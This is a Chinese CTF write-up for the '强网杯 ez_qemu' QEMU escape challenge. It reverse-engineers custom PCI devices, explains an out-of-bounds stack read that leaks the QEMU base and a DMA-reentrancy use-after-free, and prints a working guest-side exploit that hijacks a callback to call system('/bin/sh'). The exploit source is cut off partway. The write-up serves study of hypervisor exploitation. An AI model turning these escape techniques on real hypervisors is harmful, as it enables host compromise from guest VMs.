---
title: 强网杯ez_qemu-WP
date: 2026-11-15 00:00:00
tags: [PWN]
categories: writeup
top_img: /images/QWBez_qemu-WP/top.png
cover: /images/QWBez_qemu-WP/top.png
---

# 强网杯ez_qemu--WP

## 前言

第一次接触qemu escape是在2026年软件系统安全赛半决赛中，当时无能为力的看着干瞪眼，不过由于主办方的失误——他们给了 Dockerfile却没给镜像文件，由于线下断网，连库文件都凑不齐，环境都搭不起来，最终题目全场无人能解，于是我就没多在意。

第二次是在备赛第三届长城杯决赛，第二届长城杯决赛有一道基础的qemu escape叫ccb-dev，是一道自定义 PCI 设备中的数组索引缺少边界检查，能够直接读写对象的glibc函数指针，是一道比较基础的题目，这是我真正意义上第一次写qemu escape exp。

第三次大概就是这一次了，是共享对象访问时未上锁导致的UAF，有点类似于linux kernel pwn在linux v5版本里面的userfaultfd竞态利用。搭配整形溢出导致的越界读，可以实现最终的escape。

那么，让我们开始吧。

相关文件可以在这里下载：
[题目附件、还原源码与 EXP](/downloads/QWBez_qemu-WP/QWBez_qemu-WP-files.zip)

## 题解

### qemu 设备逆向分析

题目在run.sh的启动参数中注册了五个自定义 PCI 设备：

```bash
-device ctf-nic -device ctf-watchdog -device ctf-audio -device ctf-logger \
-device ctf-msg
```

在创建设备时需要对应的TypeInfo，其中会引用name字符串，可以在ida里面通过查找对应字符串在全局数据段的引用来定位设备对应TypeInfo。

```c
struct TypeInfo
{
    const char *name;
    const char *parent;

    size_t instance_size;
    size_t instance_align;
    void (*instance_init)(Object *obj);
    void (*instance_post_init)(Object *obj);
    void (*instance_finalize)(Object *obj);

    bool abstract;
    size_t class_size;

    void (*class_init)(ObjectClass *klass, void *data);
    void (*class_base_init)(ObjectClass *klass, void *data);
    void *class_data;

    InterfaceInfo *interfaces;
};
```

这里拿ctf-nic的TypeInfo举例：
![ctf-nic-TypeInfo](/images/QWBez_qemu-WP/ctf-nic-TypeInfo.png)

大致为：

```c
#define TYPE_CTF_NIC "ctf-nic"

static const TypeInfo ctf_nic_info = {
    .name = TYPE_CTF_NIC,
    .parent = TYPE_PCI_DEVICE,
    .instance_size = sizeof(CTFNICState),
    .class_init = ctf_nic_class_init,
    .interfaces =
        (InterfaceInfo[]){
            { INTERFACE_CONVENTIONAL_PCI_DEVICE },
            {},
        },
};
```

需要重点关注class_init函数，其在设备初始化时被调用，负责设置设备的 Class 属性和行为回调。

ctf_nic_class_init还原出的源码大致如下：

```c
#define CTF_VENDOR_ID 0x1234
#define CTF_NIC_DEVICE_ID 0x1001

static void ctf_nic_class_init(ObjectClass *klass, void *data)
{
    DeviceClass *dc = DEVICE_CLASS(klass);
    PCIDeviceClass *k = PCI_DEVICE_CLASS(klass);

    k->realize = ctf_nic_realize;
    k->vendor_id = CTF_VENDOR_ID;
    k->device_id = CTF_NIC_DEVICE_ID;
    k->revision = 1;
    k->class_id = PCI_CLASS_NETWORK_ETHERNET;
    dc->desc = "Ethernet Controller";
    set_bit(DEVICE_CATEGORY_NETWORK, dc->categories);
}
```

DeviceClass是通用设备类结构体，PCIDeviceClass是继承自 DeviceClass 的 PCI 设备类结构体。

进一步追踪具体实现，即realize函数：

```c
OBJECT_DECLARE_SIMPLE_TYPE(CTFNICState, CTF_NIC)

static void ctf_nic_realize(PCIDevice *pdev, Error **errp)
{
    CTFNICState *s = CTF_NIC(pdev);

    s->shared = ctf_shared_object_slot();
    pci_config_set_interrupt_pin(pdev->config, 1);
    memory_region_init_io(&s->mmio, OBJECT(s), &ctf_nic_mmio_ops, s, TYPE_CTF_NIC, CTF_MMIO_SIZE);
    pci_register_bar(pdev, 0, PCI_BASE_ADDRESS_SPACE_MEMORY, &s->mmio);
}
```

ctf_nic_realize 首先通过类型转换宏CTF_NIC将通用的 PCIDevice 指针转换为自定义的 CTFNICState 设备状态结构体指针，随后设置 PCI 中断引脚，再通过 memory_region_init_io 初始化 MMIO 内存区域并绑定读写回调，最后通过 pci_register_bar 将该区域注册到 PCI BAR0，供 Guest 访问。

关注ctf_nic_mmio_ops：

```c
static const MemoryRegionOps ctf_nic_mmio_ops = {
    .read = ctf_nic_mmio_read,
    .write = ctf_nic_mmio_write,
    .endianness = DEVICE_LITTLE_ENDIAN,
    .valid = {
        .min_access_size = 1,
        .max_access_size = 4,
        .unaligned = true,
    },
    .impl = {
        .min_access_size = 1,
        .max_access_size = 4,
    },
};
```

ctf_nic_mmio_ops 定义设备 MMIO 的读写回调函数、字节序以及访问大小限制：.read 和 .write 分别处理 Guest 的 MMIO 读写请求，.endianness 指定小端序，.valid 限制合法访问的大小为 1～4 字节且允许非对齐访问，.impl 则限制底层实际实现的访问大小为 1～4 字节。

关注.read和.write：

```c
static uint64_t ctf_nic_mmio_read(void *opaque, hwaddr addr, unsigned int size)
{
    CTFNICState *s = opaque;
    unsigned int byte_offset = addr & 3;
    uint32_t value = 0;

    switch (addr & ~3ULL) {
    case 0x00:
        value = s->tx_desc_gpa;
        break;
    case 0x04:
        /*考虑篇幅问题，以下的其他case均被省略*/
        break;
    default:
        break;

    return ctf_extract_register_bytes(value, byte_offset, size);
}

static void ctf_nic_mmio_write(void *opaque, hwaddr addr, uint64_t value, unsigned int size)
{
    CTFNICState *s = opaque;
    unsigned int byte_offset = addr & 3;
    uint64_t high;

    switch (addr & ~3ULL) {
    case 0x00:
        /*考虑篇幅问题，省略部分case*/
    case 0x10:
        high = s->rx_desc_gpa & 0xffffffff00000000ULL;
        s->rx_desc_gpa =
            high | ctf_deposit_register_bytes(s->rx_desc_gpa, value, byte_offset, size);
        break;
    case 0x14:
        s->rx_desc_gpa =
            (uint32_t)s->rx_desc_gpa |
            ((uint64_t)ctf_deposit_register_bytes(s->rx_desc_gpa >> 32, value, byte_offset, size)
             << 32);
        break;
    case 0x1c:
        /*省略*/
    default:
        break;
    }
}
```

这两个函数会在我们对设备内存进行读写时触发，这里给一个示例：

```c
#include <stdint.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <unistd.h>

#define DEVICE "0000:00:03.0"
#define MMIO_SIZE 0x1000

static void pci_enable_bus_master(void)
{
    uint16_t command;
    char path[128];
    snprintf(path, sizeof(path),
             "/sys/bus/pci/devices/%s/config", DEVICE);
    int fd = open(path, O_RDWR);
    // 读取偏移 0x04 处的PCI Command Register
    pread(fd, &command, sizeof(command), 0x04);
    // 设置 Bus Master Enable
    command |= 0x0004;
    pwrite(fd, &command, sizeof(command), 0x04);
    close(fd);
}

int main(void)
{
    char path[128];

    // 开启 PCI Bus Master，使设备能够主动发起 DMA 传输
    pci_enable_bus_master();
    snprintf(path, sizeof(path),
             "/sys/bus/pci/devices/%s/resource0", DEVICE);

    int fd = open(path, O_RDWR | O_SYNC);
    volatile uint32_t *mmio = mmap(
        NULL, MMIO_SIZE,
        PROT_READ | PROT_WRITE,
        MAP_SHARED, fd, 0
    );
    // 读取 0x00 偏移地址，会触发 ctf_nic_mmio_read的case 0x00分支
    // 其中ctf_nic_mmio_read函数的参数addr==0, size==4
    uint32_t value = mmio[0x00 / 4];
    // 写入 0x10 偏移地址，会触发 ctf_nic_mmio_write的 case 0x10分支
    // 其中ctf_nic_mmio_write函数的参数addr==0x10, val=0x12345678, size==4
    mmio[0x10 / 4] = 0x12345678;

    munmap((void *)mmio, MMIO_SIZE);
    close(fd);
    return 0;
}
```

现在我们需要找到自定义pci设备的文件在哪里。

pci设备存放在`/sys/bus/pci/devices/`。如：

```text
0000:00:03.0
0000:00:04.0
0000:00:05.0
0000:00:06.0
0000:00:07.0
```

这些目录每一个代表一个 PCI 设备，命名格式为`Domain:Bus:Device.Function`。里面有一些文件,如：

- vendor：PCI 厂商 ID，用于识别设备所属厂商。
- device：PCI 设备 ID，用于区分具体设备型号。
- resource：记录设备各个 BAR 的资源信息，包括起始物理地址、结束物理地址和资源标志。第一行对应 BAR0。
- resource0：对应 BAR0 的设备文件，可以通过 open() 和 mmap() 映射到用户空间，进而访问设备的 MMIO 寄存器。
- config：PCI 配置空间，可以读取或修改 PCI 配置寄存器，例如 Command Register 中的 Bus Master Enable 位。

可以通过一个命令一键查看：

```bash
for dev in /sys/bus/pci/devices/*; do
    echo "=== $(basename "$dev") ==="
    printf "Vendor: "; cat "$dev/vendor"
    printf "Device: "; cat "$dev/device"
    printf "BAR0:   "; head -n 1 "$dev/resource"
done
```

对于本题，输出为：

```text
=== 0000:00:00.0 ===
Vendor: 0x8086
Device: 0x29c0
BAR0:   0x0000000000000000 0x0000000000000000 0x0000000000000000
=== 0000:00:01.0 ===
Vendor: 0x1234
Device: 0x1111
BAR0:   0x00000000fd000000 0x00000000fdffffff 0x0000000000042208
=== 0000:00:02.0 ===
Vendor: 0x8086
Device: 0x10d3
BAR0:   0x00000000feb80000 0x00000000feb9ffff 0x0000000000040200
=== 0000:00:03.0 ===
Vendor: 0x1234
Device: 0x1001
BAR0:   0x00000000febd5000 0x00000000febd5fff 0x0000000000040200
=== 0000:00:04.0 ===
Vendor: 0x1234
Device: 0x1002
BAR0:   0x00000000febd6000 0x00000000febd6fff 0x0000000000040200
=== 0000:00:05.0 ===
Vendor: 0x1234
Device: 0x1003
BAR0:   0x00000000febd7000 0x00000000febd7fff 0x0000000000040200
=== 0000:00:06.0 ===
Vendor: 0x1234
Device: 0x1004
BAR0:   0x00000000febd8000 0x00000000febd8fff 0x0000000000040200
=== 0000:00:07.0 ===
Vendor: 0x1234
Device: 0x1005
BAR0:   0x00000000febd9000 0x00000000febd9fff 0x0000000000040200
=== 0000:00:1f.0 ===
Vendor: 0x8086
Device: 0x2918
BAR0:   0x0000000000000000 0x0000000000000000 0x0000000000000000
=== 0000:00:1f.2 ===
Vendor: 0x8086
Device: 0x2922
BAR0:   0x0000000000000000 0x0000000000000000 0x0000000000000000
=== 0000:00:1f.3 ===
Vendor: 0x8086
Device: 0x2930
BAR0:   0x0000000000000000 0x0000000000000000 0x0000000000000000
```

回看ctf_nic_class_init，我们便可以通过vendor_id和device_id确认0000:00:03.0为ctf-nic设备，其在内存中映射的物理地址为0xfebd5000。

那么，其他几个设备也可以如法炮制的进行逆向分析，此处不再赘述了。

### 信息泄露

ctf-logger在write函数中存在一个越界读漏洞：

```c
#define CTF_LOG_PAGE_SIZE 0x1000
#define CTF_LOG_MAX_LENGTH 0x10000

static void ctf_logger_copy(CTFLoggerState *s)
{
    uint8_t page[CTF_LOG_PAGE_SIZE];
    uint32_t requested;
    size_t available;
    uint32_t transfer_length;

    requested = s->length;
    if (requested > CTF_LOG_MAX_LENGTH) {
        requested = CTF_LOG_MAX_LENGTH;
    }

    memset(page, 0, sizeof(page));
    available = sizeof(page) - s->offset;
    transfer_length = requested <= available ? requested : available;

    fprintf(stderr, "[CTF] D: copy off 0x%x len %u trans_len 0x%x\n", s->offset, requested,
            transfer_length);

    if (transfer_length) {
        pci_dma_write(&s->parent_obj, s->dma_addr, page + s->offset, transfer_length);
    }

    s->transferred = transfer_length;
    s->status |= 1;
}

static void ctf_logger_mmio_write(void *opaque, hwaddr addr, uint64_t value, unsigned int size)
{
    CTFLoggerState *s = opaque;
    unsigned int byte_offset = addr & 3;

    switch (addr & ~3ULL) {
    case 0x00:
        s->dma_addr = (s->dma_addr & 0xffffffff00000000ULL) |
                      ctf_deposit_register_bytes(s->dma_addr, value, byte_offset, size);
        break;
    case 0x04:
        s->dma_addr =
            (uint32_t)s->dma_addr |
            ((uint64_t)ctf_deposit_register_bytes(s->dma_addr >> 32, value, byte_offset, size)
             << 32);
        break;
    case 0x08:
        s->offset = ctf_deposit_register_bytes(s->offset, value, byte_offset, size);
        break;
    case 0x0c:
        s->length = ctf_deposit_register_bytes(s->length, value, byte_offset, size);
        break;
    case 0x10:
        s->status &= ~1U;
        ctf_logger_copy(s);
        break;
    default:
        break;
    }
}
```

使用一个位于 Host 栈上的固定大小缓冲区，长度为 0x1000。

当 offset 大于 0x1000 时，available 发生无符号整数下溢。此时 copy_len 不再受缓冲区剩余长度的正确限制，page + offset 可以指向 Host 栈上的其他数据。

这里pci_dma_write 的含义是**设备向 Guest 物理内存写入数据**,我们需要提供Guest的物理地址。
可以通过`/proc/self/pagemap`文件获取虚拟地址映射的物理地址，其中每一个entry表项有8字节，储存一个页的信息，格式大致为：
![pagemap-entry](/images/QWBez_qemu-WP/pagemap-entry.png)

利用时设置offset = 0x1010,length = 0x10，可以越界读到ctf_logger_copy的saved_rbp和saved_rip，其中第二个值对应可用于定位 QEMU PIE 的返回地址。

```c
ctf_logger_set_offset(0x1010);
ctf_logger_set_length(0x10);
ctf_logger_set_dma_addr((uint64_t)virt_to_phys((const void *)buffer));
ctf_logger_copy();

qemu_base = *(uint64_t *)(&buffer[8]) - 0x4132C7;
system_plt = qemu_base + 0x2E2C94;
printf(SUCCESS_MSG("[+] qemu_base: 0x%lx\n"), qemu_base);
printf(INFO_MSG("[*] system_plt_addr: 0x%lx\n"), system_plt);
```

### 内存破坏

题目有两个UAF漏洞。

最显而易见的是ctf-msg的UAF漏洞：

```c
typedef struct CTFMsgObject {
    int (*callback)(const char *message);
    char message[48];
    uint64_t reserved;
} CTFMsgObject;

static void ctf_msg_create(CTFMsgState *s)
{
    if (s->state != 1) {
        s->object = g_malloc(sizeof(*s->object));
        s->object->callback = puts;
        strcpy(s->object->message, "maybe uaf here");
        s->object->reserved = 0;
        s->state = 1;
        fprintf(stderr, "[CTF] E: object created (size %zu)\n", sizeof(*s->object));
    }
}

static void ctf_msg_free(CTFMsgState *s)
{
    if (s->state == 1) {
        fwrite("[CTF] E: object freed\n", 1, 22, stderr);
        g_free(s->object);
        s->state = 2;
    }
}

static void ctf_msg_invoke(CTFMsgState *s)
{
    if (s->object) {
        fwrite("[CTF] E: invoke\n", 1, 16, stderr);
        s->object->callback(s->object->message);
    }
}


static void ctf_msg_mmio_write(void *opaque, hwaddr addr, uint64_t value, unsigned int size)
{
    CTFMsgState *s = opaque;

    switch (addr & ~3ULL) {
    case 0x00:
        ctf_msg_create(s);
        break;
    case 0x04:
        ctf_msg_free(s);
        break;
    case 0x08:
        ctf_msg_invoke(s);
        break;
    default:
        break;
    }
}
```

但遗憾的是，这个结构体大小为0x40，堆块的大小将是0x50，和其他对象大小不一致，笔者也暂时没有发现qemu中其他合适的结构体来进行UAF写。

另一个不太显而易见的是ctf-nic和ctf-watchdog的共享对象未加锁导致的UAF：

```c
static CTFSharedObject *ctf_shared_object;

CTFSharedObject **ctf_shared_object_slot(void) { return &ctf_shared_object; }

static void ctf_nic_handle_rx(CTFNICState *s)
{
    CTFSharedObject *notify_object = *s->shared;
    CTFNICRxDesc desc;
    uint32_t completion_value = 1;
    uint32_t total = 0;
    uint32_t length;

    fwrite("[CTF] A: RX begin\n", 1, 18, stderr);
    memset(&desc, 0, sizeof(desc));

    if (pci_dma_read(&s->parent_obj, s->rx_desc_gpa, &desc, sizeof(desc))) {
        fwrite("[CTF] A: RX desc read failed\n", 1, 29, stderr);
    }

    length = desc.length1;
    if (length >= CTF_NIC_BUFFER_SIZE) {
        length = CTF_NIC_BUFFER_SIZE;
    }
    if (length) {
        pci_dma_write(&s->parent_obj, desc.buffer1_gpa, s->rx_buffer, length);
        total += length;
    }

    length = desc.length2;
    if (CTF_NIC_BUFFER_SIZE - total <= length) {
        length = CTF_NIC_BUFFER_SIZE - total;
    }
    if (length) {
        pci_dma_write(&s->parent_obj, desc.buffer2_gpa, s->rx_buffer + total, length);
        total += length;
    }

    if (desc.completion_gpa) {
        pci_dma_write(&s->parent_obj, desc.completion_gpa, &completion_value,
                      sizeof(completion_value));
    }

    s->rx_len = total;
    s->completion_status |= 2;
    s->irq_status |= 2;
    ctf_nic_update_irq(s);

    fprintf(stderr, "[CTF] A: RX done (len %u)\n", total);
    fwrite("[CTF] A: RX end\n", 1, 16, stderr);
    if (notify_object) {
        notify_object->callback(notify_object->message);
    }
}

static void ctf_nic_mmio_write(void *opaque, hwaddr addr, uint64_t value, unsigned int size)
{
    CTFNICState *s = opaque;
    unsigned int byte_offset = addr & 3;
    uint64_t high;

    switch (addr & ~3ULL) {
    case 0x00:
        /*省略*/
    case 0x1c:
        s->rx_ctrl = ctf_deposit_register_bytes(s->rx_ctrl, value, byte_offset, size);
        if (s->rx_ctrl & 1) {
            s->rx_ctrl &= ~1U;
            s->completion_status &= ~2U;
            ctf_nic_handle_rx(s);
        }
        ctf_nic_update_irq(s);
        break;
    case 0x24:
        /*省略*/
        break;
    default:
        break;
    }
}

static void ctf_nic_realize(PCIDevice *pdev, Error **errp)
{
    CTFNICState *s = CTF_NIC(pdev);

    s->shared = ctf_shared_object_slot();
    pci_config_set_interrupt_pin(pdev->config, 1);
    memory_region_init_io(&s->mmio, OBJECT(s), &ctf_nic_mmio_ops, s, TYPE_CTF_NIC, CTF_MMIO_SIZE);
    pci_register_bar(pdev, 0, PCI_BASE_ADDRESS_SPACE_MEMORY, &s->mmio);
}
```

如果你还记得——ctf_nic_realize有调用ctf_shared_object_slot并存储了共享对象指针的指针。而在write时得以触发的ctf_nic_handle_rx中，会调用pci_dma_write进行至多三次写，最后调用共享对象的callback。

让我们看一下共享对象：

```c
typedef struct CTFSharedObject {
    QEMUTimer *timer;
    char message[64];
    int (*callback)(const char *message);
    uint32_t state;
    uint32_t generation;
} CTFSharedObject;

CTFSharedObject *ctf_shared_object_new(const char *tag)
{
    CTFSharedObject *object = g_new0(CTFSharedObject, 1);

    object->timer = timer_new_ms(QEMU_CLOCK_VIRTUAL, ctf_shared_timer_expired, object);
    object->callback = puts;
    strcpy(object->message, "timer fired");
    object->state = 0;
    object->generation = ++ctf_shared_generation;

    fprintf(stderr, "[CTF] %s: created timer OK (size %zu)\n", tag, sizeof(*object));
    return object;
}

void ctf_shared_object_free(CTFSharedObject *object)
{
    if (!object) {
        return;
    }

    fwrite("[CTF] B: timer freed OK\n", 1, 24, stderr);
    timer_free(object->timer);
    g_free(object);
}
```

是一个大小为0x58，堆块大小将是0x60的堆上对象。

另一个ctf-watchdog也会访问这个共享对象：

```c
static CTFSharedObject *ctf_watchdog_ensure(CTFWatchdogState *s)
{
    if (!*s->shared) {
        *s->shared = ctf_shared_object_new("B");
    }
    return *s->shared;
}

static void ctf_watchdog_destroy(CTFWatchdogState *s)
{
    if (*s->shared) {
        ctf_shared_object_free(*s->shared);
        *s->shared = NULL;
    }
}

static void ctf_watchdog_mmio_write(void *opaque, hwaddr addr, uint64_t value, unsigned int size)
{
    CTFWatchdogState *s = opaque;
    unsigned int byte_offset = addr & 3;

    switch (addr & ~3ULL) {
    case 0x00:
        /*省略*/
        break;
    case 0x24:
        ctf_watchdog_ensure(s);
        break;
    case 0x28:
        ctf_watchdog_destroy(s);
        break;
    default:
        break;
    }
}

static void ctf_watchdog_realize(PCIDevice *pdev, Error **errp)
{
    CTFWatchdogState *s = CTF_WATCHDOG(pdev);

    s->shared = ctf_shared_object_slot();
    s->timeout_ms = 1000;
    pci_config_set_interrupt_pin(pdev->config, 1);
    memory_region_init_io(&s->mmio, OBJECT(s), &ctf_watchdog_mmio_ops, s, TYPE_CTF_WATCHDOG,
                          CTF_MMIO_SIZE);
    pci_register_bar(pdev, 0, PCI_BASE_ADDRESS_SPACE_MEMORY, &s->mmio);
    ctf_watchdog_ensure(s);
}
```

在ctf-watchdog初始化时，共享对象便通过ctf_watchdog_ensure创建。在正常的流程下，ctf_nic_handle_rx中callback会调用puts函数。
但问题出现在中间调用pci_dma_write进行的dma写，guest不一定要是Guest程序自己的内存，也可以是其他pci设备的物理内存。换句话说，在ctf_nic_handle_rx执行过程中可以通过pci_dma_write写入其他 PCI 设备的 MMIO 区域, 触发对应设备的 MMIO 回调,最终可以调用ctf_watchdog_destroy等函数，由此便构成了一个由重入引起的UAF。

那么，笔者的大致漏洞利用思路便从这里展开：
![uaf-chunk-reuse-flow](/images/QWBez_qemu-WP/uaf-chunk-reuse-flow.png)

首先，NIC 在 ctf_nic_handle_rx 中保存共享对象的指针。随后通过 ctf_watchdog_destroy 释放原有 chunk A，再由 ctf_audio_allocate 重新分配到原有 chunk A。最后，ctf_audio_dma_write_buffer 将 Guest payload 写入该内存，覆写原对象的 callback 和 message，使 NIC 后续通过悬空指针调用 system("/bin/sh")。

其中：

```c
typedef struct CTFAudioBuffer {
    uint8_t data[80];
    uint32_t length;
    uint32_t format;
} CTFAudioBuffer;

static void ctf_audio_allocate(CTFAudioState *s)
{
    if (!s->buffer) {
        s->buffer = g_malloc0(sizeof(*s->buffer));
        fprintf(stderr, "[CTF] C: buffer allocated (size %zu)\n", sizeof(*s->buffer));
    }
}

static void ctf_audio_dma_write_buffer(CTFAudioState *s)
{
    uint32_t length;

    if (!s->buffer) {
        return;
    }

    length = s->dma_len;
    if (length >= sizeof(s->buffer->data)) {
        length = sizeof(s->buffer->data);
    }

    if (length) {
        pci_dma_read(&s->parent_obj, s->dma_addr, s->buffer->data, length);
    }
    fprintf(stderr, "[CTF] C: wrote %u bytes\n", length);
}
```

CTFAudioBuffer结构体大小刚好是0x58，与共享对象一致，而data恰好覆盖共享对象的 callback 和 message。

那么，最大的问题便在于如何使用ctf_audio_allocate重新分配到原有 chunk A。

首先，第一个共享对象是在在ctf-watchdog初始化创建的，会在主线程上进行分配，得到的自然就是main_arena管理的 chunk，而 MMIO 回调由vCPU线程处理，能够获取的 chunk自然就是thread_arena管理的 chunk。所以我们自然要先进行一次共享对象重建。

其次，g_malloc0 会使用 calloc 进行堆块的申请，在libc的2.35版本，其不会从 tcachebins 中进行分配。但 free 函数却会在tcachebins对应bins未满时把一个堆块放进 tcachebins。那么，我们便需要通过反复重建共享对象，尽可能确保对应的tcachebin是满的。之后，自然会free进fastbins，而calloc在libc2.35可以使用fastbins中的堆块，且fastbins先进后出，可以立刻申请回来。

那么，内存破坏阶段的利用代码我们也可以给出了：

```c
// step2:alloc shared object from vCPU thread arena and fill tcache[0x60]
for (int i = 0; i < 8; i++) {
    ctf_watchdog_destroy();
    ctf_watchdog_ensure();
}

// step3: UAF while ctf_nic_handle_rx()
CTFNICRxDesc *payload1 = (CTFNICRxDesc *)buffer;
payload1->buffer1_gpa = pci_bar0[CTF_WATCHDOG] + 0x28; // ctf_watchdog_destroy
payload1->length1 = 4;
payload1->buffer2_gpa = pci_bar0[CTF_AUDIO]; // ctf_audio_allocate
payload1->length2 = 4;
payload1->completion_gpa = pci_bar0[CTF_AUDIO] + 0x14; // ctf_audio_dma_write_buffer

CTFSharedObject *payload2 = (CTFSharedObject *)(buffer + sizeof(CTFNICRxDesc));
strncpy(payload2->message, "/bin/sh", sizeof(payload2->message));
payload2->callback = (void *)system_plt;

ctf_nic_set_rx_desc_gpa((uint64_t)virt_to_phys((const void *)payload1));
ctf_audio_set_dma_addr((uint64_t)virt_to_phys((const void *)payload2));
ctf_audio_set_dma_len(0x50);

ctf_nic_handle_rx(); // trigger attack!
```

### 最终实现及远程利用

这里给出我的最终exp:

```c
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include <ctype.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#define SUCCESS_MSG(msg) "\033[32m\033[1m" msg "\033[0m"
#define INFO_MSG(msg) "\033[34m\033[1m" msg "\033[0m"
#define ERROR_MSG(msg) "\033[31m\033[1m" msg "\033[0m"

#define log_success(msg) puts(SUCCESS_MSG(msg))
#define log_info(msg) puts(INFO_MSG(msg))
#define log_error(msg) puts(ERROR_MSG(msg))

#define MMIO_SIZE 0x1000

enum {
    CTF_NIC = 0,
    CTF_WATCHDOG = 1,
    CTF_AUDIO = 2,
    CTF_LOGGER = 3,
    CTF_MSG = 4,
    DEVICE_COUNT = 5,
};

typedef struct CTFNICRxDesc {
    uint64_t buffer1_gpa;
    uint32_t length1;
    uint32_t reserved1;
    uint64_t buffer2_gpa;
    uint32_t length2;
    uint32_t reserved2;
    uint64_t completion_gpa;
} CTFNICRxDesc;

typedef struct CTFSharedObject {
    void *timer;
    char message[64];
    int (*callback)(const char *message);
    uint32_t state;
    uint32_t generation;
} CTFSharedObject;

static const char *devices[DEVICE_COUNT] = {
    "0000:00:03.0", // ctf-nic
    "0000:00:04.0", // ctf-watchdog
    "0000:00:05.0", // ctf-audio
    "0000:00:06.0", // ctf-logger
    "0000:00:07.0", // ctf-msg
};

static const uint64_t pci_bar0[DEVICE_COUNT] = {
    [CTF_NIC] = 0xFEBD5000,    [CTF_WATCHDOG] = 0xFEBD6000, [CTF_AUDIO] = 0xFEBD7000,
    [CTF_LOGGER] = 0xFEBD8000, [CTF_MSG] = 0xFEBD9000,
};

int fd[DEVICE_COUNT] = { -1 };
volatile unsigned char *mmio[DEVICE_COUNT] = { NULL };

void dump_hex(const void *buf, size_t len)
{
    const unsigned char *p = buf;

    for (size_t i = 0; i < len; i += 16) {
        printf("%08zx  ", i);

        for (size_t j = 0; j < 16; j++) {
            if (i + j < len)
                printf("%02x ", p[i + j]);
            else
                printf("   ");

            if (j == 7)
                putchar(' ');
        }

        printf(" |");
        for (size_t j = 0; j < 16 && i + j < len; j++) {
            unsigned char c = p[i + j];
            putchar(isprint(c) ? c : '.');
        }
        printf("|\n");
    }
}

uint64_t virt_to_phys(const void *addr)
{
    uint64_t virt = (uintptr_t)addr;
    long page_size = sysconf(_SC_PAGESIZE);

    if (page_size <= 0) {
        fprintf(stderr, "invalid page size\n");
        exit(1);
    }

    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0) {
        perror("open pagemap");
        exit(1);
    }

    uint64_t entry;
    off_t offset = (virt / page_size) * sizeof(entry);

    if (pread(fd, &entry, sizeof(entry), offset) != sizeof(entry)) {
        perror("pread pagemap");
        close(fd);
        exit(1);
    }

    close(fd);

    if (!(entry & (1ULL << 63))) {
        fprintf(stderr, "page not present\n");
        exit(1);
    }

    uint64_t pfn = entry & ((1ULL << 55) - 1);

    if (!pfn) {
        fprintf(stderr, "PFN unavailable (check CAP_SYS_ADMIN)\n");
        exit(1);
    }

    return pfn * (uint64_t)page_size + virt % page_size;
}

// ctf_msg
void ctf_msg_create(void) { *(volatile uint32_t *)(&mmio[CTF_MSG][0]) = 0; }
void ctf_msg_free(void) { *(volatile uint32_t *)(&mmio[CTF_MSG][4]) = 0; }
void ctf_msg_invoke(void) { *(volatile uint32_t *)(&mmio[CTF_MSG][8]) = 0; }

// ctf_logger
void ctf_logger_set_offset(uint32_t offset)
{
    *(volatile uint32_t *)(&mmio[CTF_LOGGER][8]) = offset;
}
void ctf_logger_set_length(uint32_t length)
{
    *(volatile uint32_t *)(&mmio[CTF_LOGGER][0xc]) = length;
}
void ctf_logger_set_dma_addr_low(uint32_t num)
{
    *(volatile uint32_t *)(&mmio[CTF_LOGGER][0]) = num;
}
void ctf_logger_set_dma_addr_high(uint32_t num)
{
    *(volatile uint32_t *)(&mmio[CTF_LOGGER][4]) = num;
}
void ctf_logger_set_dma_addr(uint64_t addr)
{
    ctf_logger_set_dma_addr_low(addr & 0xffffffff);
    ctf_logger_set_dma_addr_high(addr >> 32);
}
void ctf_logger_copy(void) { *(volatile uint32_t *)(&mmio[CTF_LOGGER][0x10]) = 0; }

// ctf_nic
void ctf_nic_set_rx_desc_gpa_low(uint32_t num)
{
    *(volatile uint32_t *)(&mmio[CTF_NIC][0x10]) = num;
}
void ctf_nic_set_rx_desc_gpa_high(uint32_t num)
{
    *(volatile uint32_t *)(&mmio[CTF_NIC][0x14]) = num;
}
void ctf_nic_set_rx_desc_gpa(uint64_t addr)
{
    ctf_nic_set_rx_desc_gpa_low(addr & 0xffffffff);
    ctf_nic_set_rx_desc_gpa_high(addr >> 32);
}
void ctf_nic_handle_rx(void) { *(volatile uint32_t *)(&mmio[CTF_NIC][0x1c]) = 1; }

// ctf_audio
void ctf_audio_set_dma_len(uint32_t length)
{
    *(volatile uint32_t *)(&mmio[CTF_AUDIO][0x10]) = length;
}
void ctf_audio_set_dma_addr_low(uint32_t num) { *(volatile uint32_t *)(&mmio[CTF_AUDIO][8]) = num; }
void ctf_audio_set_dma_addr_high(uint32_t num)
{
    *(volatile uint32_t *)(&mmio[CTF_AUDIO][0xc]) = num;
}
void ctf_audio_set_dma_addr(uint64_t addr)
{
    ctf_audio_set_dma_addr_low(addr & 0xffffffff);
    ctf_audio_set_dma_addr_high(addr >> 32);
}

// ctf_watchdog
void ctf_watchdog_destroy(void) { *(volatile uint32_t *)(&mmio[CTF_WATCHDOG][0x28]) = 0; }
void ctf_watchdog_ensure(void) { *(volatile uint32_t *)(&mmio[CTF_WATCHDOG][0x24]) = 0; }

static void open_pci_device(int id)
{
    char path[128];

    snprintf(path, sizeof(path), "/sys/bus/pci/devices/%s/resource0", devices[id]);

    fd[id] = open(path, O_RDWR | O_SYNC);
    if (fd[id] < 0) {
        perror(path);
        exit(EXIT_FAILURE);
    }

    void *addr = mmap(NULL, MMIO_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd[id], 0);

    if (addr == MAP_FAILED) {
        perror("mmap PCI BAR0");
        close(fd[id]);
        fd[id] = -1;
        exit(EXIT_FAILURE);
    }

    mmio[id] = addr;
}

static void pci_enable_bus_master(int id)
{
    char path[128];

    snprintf(path, sizeof(path), "/sys/bus/pci/devices/%s/config", devices[id]);

    int config_fd = open(path, O_RDWR);
    if (config_fd < 0) {
        perror(path);
        exit(EXIT_FAILURE);
    }

    uint16_t command;

    if (pread(config_fd, &command, sizeof(command), 0x04) != sizeof(command)) {
        perror("pread PCI_COMMAND");
        close(config_fd);
        exit(EXIT_FAILURE);
    }

    if (!(command & 0x0004)) {
        command |= 0x0004;

        if (pwrite(config_fd, &command, sizeof(command), 0x04) != sizeof(command)) {
            perror("pwrite PCI_COMMAND");
